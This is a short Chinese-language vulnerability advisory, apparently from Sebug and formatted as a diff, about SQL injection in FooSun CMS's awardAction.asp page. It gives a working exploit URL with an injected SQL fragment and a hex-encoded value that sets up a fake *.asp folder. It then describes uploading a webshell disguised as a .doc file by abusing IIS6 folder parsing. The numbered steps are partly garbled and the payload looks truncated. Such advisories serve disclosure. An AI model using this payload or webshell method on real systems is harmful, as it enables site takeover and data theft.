@@ -1,0 +1,6 @@
+风讯（FooSun）awardAction.asp页面存在SQL注入漏洞
+
+测试方法:
+
+@Sebug.net   dis
+本站提供程序(方法)可能带有攻击性,仅供安全研究与教学之用,风险自负!1.注册用户登陆后，访问Url:2. 3.http://ssvdb.com/User/award/awardAction.asp?action=join&awardID=1&prizeID=1&Integral=0),usernumber= 0x6C006C002E00610073007000,LoginNum=(14. 5.退出后再登陆，在文件管理处上传后缀为doc的webshell就可以拿到webshell。（利用IIS6对文件夹为*.asp的解析漏洞
